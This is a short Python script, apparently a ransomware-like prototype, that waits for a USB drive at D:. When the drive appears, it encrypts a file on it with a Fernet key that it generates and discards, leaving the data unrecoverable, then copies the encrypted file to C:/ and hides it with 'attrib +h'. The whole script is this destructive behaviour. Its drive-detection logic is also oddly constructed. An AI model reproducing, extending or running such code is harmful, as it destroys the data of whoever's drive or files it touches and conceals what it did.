import random
import shutil
from time import sleep
import os
from cryptography.fernet import Fernet


def encryptionFile(file_to_encrypt):
    encryption_key = Fernet.generate_key()
    cipher = Fernet(encryption_key)
    with open(file_to_encrypt, "rb") as file:
        file_content = file.read()
    encrypted_content = cipher.encrypt(file_content)
    with open(file_to_encrypt, "wb") as file:
        file.write(encrypted_content)


def wait_for_usb(original_path):
    while True:
        if os.path.isdir(original_path):
            print("USB driver connected!")
            target_path = "C:/"
            encryptionFile(f"{original_path}/mytext.txt")
            if os.path.exists(original_path):
                if os.path.exists(target_path):
                    shutil.copy2(f"{original_path}/mytext.txt", f"{target_path}/mytext.txt")
                    os.system(f"attrib +h {target_path}/mytext.txt")
                    print("file transferred successfully!")
                    break
        else:
            print("Waiting for connection...")
            sleep(3)


def search_drivers():
    drvArr = ['C:', 'D:', 'E:', 'F:', 'G:', 'H:', 'I:', 'J:', 'K:', 'L:']
    for dl in drvArr:
        try:
            if os.path.isdir(dl):
                pass
            else:
                wait_for_usb("D:")
                break
        except:
            print("Error: findDriveByDriveLabel(): exception")
            break


if __name__ == "__main__":
    search_drivers()
